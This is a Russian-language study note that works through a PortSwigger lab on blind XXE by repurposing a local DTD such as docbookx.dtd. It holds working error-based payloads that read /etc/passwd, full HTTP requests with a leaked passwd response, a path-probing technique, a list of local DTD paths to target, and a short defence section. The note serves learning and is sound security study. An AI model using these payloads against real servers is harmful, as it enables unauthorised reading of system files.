#   5  BLIND  XXE c перепрофилированием локального DTD , который полностью указан в элементе `DOCTYPE`


##### **Перепрофилирование** (в контексте этой атаки) — это когда я беру существующий на сервере файл (DTD), который создавался для одних целей, и использую его **совсем не по назначению**, заставляя парсер выполнить мои инструкции через него
#### важно
## Для Linux-систем с ==GNOME== часто есть файл `/usr/share/yelp/dtd/docbookx.dtd`, в котором определена сущность `ISOamso`


> Эта техника используется **когда нет возможности загрузить внешний DTD с моего сервера**, но есть локальный DTD-файл на самом сервере. Я переопределяю существующую в нем сущность, вставляю туда Error-Based пейлоад и получаю данные в ошибке

==Красота метода:== мне не нужен свой сервер, не нужно исходящих соединений, все работает локально на сервере жертвы 


решение подсмотрел.. так как это вынос мозга
----
доп теория:

если DTD внешний - тогда можно было указать -соответсвенно- свой DTD на своем сервере и заставить цель-сервер сделать запрос ко мне и тем самым иметь возможность получать данные

но когда DTD внутренний, который указан в элементе DOCTYPE полностью.

> Согласно спецификации XML

==во внутренних параметрах DTD не разрешено  использование сущности параметра XML в определении сущности другого параметра!

Если DTD документа использует гибрид внутренних и внешних деклараций DTD, то внутренний DTD может переосмыслить объекты, которые объявлены во внешнем DTD. Когда это происходит, ограничение на использование объекта параметра XML в определении сущности другого параметра смягчается

Например, предположим, что в файловой системе сервера есть файл DTD по адресу location`/usr/local/app/schema.dtd`, и этот файл DTD определяет объект под названием `custom_entity`. Злоумышленник может запустить сообщение об ошибке синтаксического анализа XML, содержащее содержимое файла `/etc/passwd`, отправив гибридный DTD, как это:
```js

		XML 

<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
	<!ENTITY % custom_entity ' 
	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
	&#x25;eval; 
	&#x25;error; 
	'> 
	%local_dtd; 
	]>
```

Этот DTD выполняет следующие шаги:

- Определяет сущность параметров XML под названием `local_dtd`, содержащую содержимое внешнего файла DTD, существующего в файловой системе сервера
- Переопределяет сущность параметра XML под названием `custom_entity`, которая уже определена во внешнем файле DTD. Объект переопределен как содержащий уже описанный, для запуска сообщения об ошибке, содержащего содержимое файла `/etc/passwd`
- Использует сущность `local_dtd`, чтобы интерпретировать внешний DTD, включая переопределенное значение сущности `custom_entity`. Это приводит к желаемому сообщению об ошибке


## Поиск существующего файла DTD для перепрофилирования

нужно вот так перебирать варианты рзаличных путей к файлам, 
при валидном пути - ошибки не будет!
при ошибочном пути - синтаксис xml выдаст ошибку!

```http

<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```



# теперь простыми словами тоже самое:
```ls
		XML 

<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
	<!ENTITY % custom_entity ' 
	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
	&#x25;eval; 
	&#x25;error; 
	'> 
	%local_dtd; 
	]>
```

==разбор==

------

**ISOamso** — это просто имя сущности (entity), которая определена в системном файле Linux `/usr/share/yelp/dtd/docbookx.dtd`
Эта сущность используется в DocBook (формат для технической документации) для подстановки математических символов

В оригинальном файле `docbookx.dtd` есть строка:
```xml

<!ENTITY % ISOamso PUBLIC "ISO 8879:1986//ENTITIES Added Math Symbols: Ordinary//EN//XML" "isoamso.ent">
```
---

```js
XML

<!DOCTYPE foo [ 
// oткр DOCTYPE с корневым элементом foo. Дальше внутри квадратных скобок будет мой DTD.

<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
// обьявил параметрическую сущность с именем local_dtd
// которая должна прочесть файл schema.dtd на сервере

<!ENTITY % custom_entity '
// обьяв параметрическую сущность с именем custom_entity
// все что внутри этой сущности это самое основное!

<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
//сущность file параметрическая тоже  
// &#x25;  это %
// почему закодирован процент? потому что если не кодир его тогда парсер попытался бы подставить сущность с именем file немедленно, а она еще не объявлена
// после декодирования будет <!ENTITY % file SYSTEM "file:///etc/passwd">
// сущность file читает файл file:///etc/passwd 

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
// &#x25; — это %
// &#x26;#x25; — это код симв &, за которым идет код для %, вместе дают &#x25; обход двойн кодировки
// &#x27; это одинарная кавычка '
// после декодлирования юудет <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
// в целом это параметр сущность eval которая содержит объявление** другой сущности error
// error будет пытаться открыть файл по пути /nonexistent/ а в конец пути подставится содержимое %file (то есть /etc/passwd).


далее вызываем по порядку сущности

&#x25;eval;

// &#x25;eval; превращается в %eval; — вызывает сущность eval, что создает сущность error

&#x25;error;

// &#x25;error; превращается в %error;  вызывает только что созданную error, что провоцирует ошибку с содержимым файла

'>
%local_dtd;
]>

// Закрываю значение custom_entity. 
// Потом вызываю %local_dtd; что заставляет парсер загрузить локальный DTD-файл, 
// но с моим переопределением custom_entity
// В результате парсер использует мое вредоносное определение вместо того, что было в оригинальном файле

```

### Я могу переопределить сущность в локальном DTD, потому что парсер сначала грузит внешний файл, потом применяет мои переопределения, и это снимает ограничение на вложенные параметрические сущности


---

#### как использовать такую уязвимость?
1 нет запроса к моему серверу = исходящие запросы заблокированы
2 данные не отображаются в ответе
3 сервер использует Linux с GNOME — там часто есть файл `/usr/share/yelp/dtd/docbookx.dtd` (или похожие системные DTD)
4 МОГУ УГАДЫВАТЬ ПУТИ ФАЙЛОВ 
##### вот так `<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///путь/к/файлу.dtd"> %local_dtd; ]>`

	- при валидном пути нет ошибки от сервера
	- при ошибочном - ошибка

# как обнаружить ?
пример
базовый запрос 
```http
POST /product/stock HTTP/2
Host: 0a2c00f704db0d81800e3a8a00e8005d.web-security-academy.net
Cookie: session=B6XO7eAYHdSYnNCxEoLmEtE7brMC9Aa2
...

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

делаю запрос к файлу   
`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>`
```http

POST /product/stock HTTP/2
Host: 0a2c00f704db0d81800e3a8a00e8005d.web-security-academy.net
Cookie: session=B6XO7eAYHdSYnNCxEoLmEtE7brMC9Aa2
...


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и нет ошибки в ответе от сервера - значит файл есть по этому пути!

если же запрос с невалидным путем к файлу - то xml ошибка попасть может в ответе (что уже нехорошо)
```http
POST /product/stock HTTP/2
Host: 0a2c00f704db0d81800e3a8a00e8005d.web-security-academy.net
Cookie: session=B6XO7eAYHdSYnNCxEoLmEtE7brMC9Aa2
...


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docx.dtd">
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>


---
на невалидный путь сервер отвечает О Ш И Б К О Й No such file or directory !

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 119

"XML parser exited with error: java.io.FileNotFoundException: /usr/share/yelp/dtd/docx.dtd (No such file or directory)"

```

# 👉 ниже я покажу список стандартных путей которые можно проверять

------

## решение лабы (подсмотрел)
#### запрос / ответ



![[СнимокXML_(XXE)19.16.1911.png]]

```http
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>




-------------

ответ 




HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2419

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
```

-------
## Как защититься

==**На уровне приложения:**

1  **Отключить обработку DOCTYPE полностью** — `disallow-doctype-decl`
   
2  **Запретиь внешние сущности** — `setExpandEntityReferences(false)`
   
3  **Отключить поддержку XInclude**
   
4  **Использовать JSON вместо XML** — вообще без вариантов
   

==**На уровне ОС:**  

5   **Удалить ненужные системные DTD-файлы** — если они не используются приложением  

6   **Ограничить права на чтение системных DTD** — только для root, не для www-data

==**На уровне мониторинга:**  

7   **Логировать ошибки XML-парсера** — нестандартные пути в ошибках могут сигналить об атаке  

8   **WAF с правилами на XXE** — обнаруживает попытки загрузки локальных файлов через `file://`



----------
#  ⭐️⏺️ список стандартных путей для поиска и проверок!

## Linux / Unix системы
```js
xml

<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">   <!-- GNOME, ISOamso -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">   <!-- Cisco WebEx, url.attribute.set -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">   <!-- fonts.dtd, constant/expr -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/struts/struts-config_1_1.dtd">   <!-- Struts, AttributeName -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/boostbook/dtd/boostbook.dtd">   <!-- Boost, boost.common.attrib -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/dblatex/schema/dblatex-config.dtd">   <!-- dblatex, attlist.modname -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/nmap/nmap.dtd">   <!-- Nmap, attr_numeric -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-4/language-specs/language.dtd">   <!-- GTK, itemattrs -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd">   <!-- PerfSuite, expr -->
```
## Windows системы

```js
xml

<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">   <!-- CIM, SuperClass/CIMName -->
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd">   <!-- WMI, CIMName -->
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd">   <!-- XWizard, onerrortypes -->
<!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd">   <!-- Lotus Notes, boolean -->
```
## Java/ Tomcat/WebSphere ( в JAR-архивах)

```js
xml

<!ENTITY % local_dtd SYSTEM "jar:file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">   <!-- Tomcat, URI/Body -->
<!ENTITY % local_dtd SYSTEM "jar:file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">   <!-- Tomcat, Boolean -->
<!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">   <!-- WebSphere, condition -->
<!ENTITY % local_dtd SYSTEM "./../../properties/schemas/j2ee/XMLSchema.dtd">   <!-- WebSphere, xs-datatypes -->
<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">   <!-- Citrix, Body -->
<!ENTITY % local_dtd SYSTEM "jar:file:///opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">   <!-- JBoss, queries -->
```
## Дополнительные специфичные пути

```js
xml

<!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">   <!-- GAP, n.InProceedings -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/libgweather/locations.dtd">   <!-- GWeather, name -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd">   <!-- Perl LibXML -->
<!ENTITY % local_dtd SYSTEM "file:///usr/share/sgml/dtd/xml-core/catalog.dtd">   <!-- XML Core, publicIdentifier -->
<!ENTITY % local_dtd SYSTEM "file:///etc/vmware-tools/vgauth/schemas/XMLSchema.dtd">   <!-- VMware, xs-datatypes -->
<!ENTITY % local_dtd SYSTEM "file:///usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd">   <!-- LibreOffice, boolean -->
```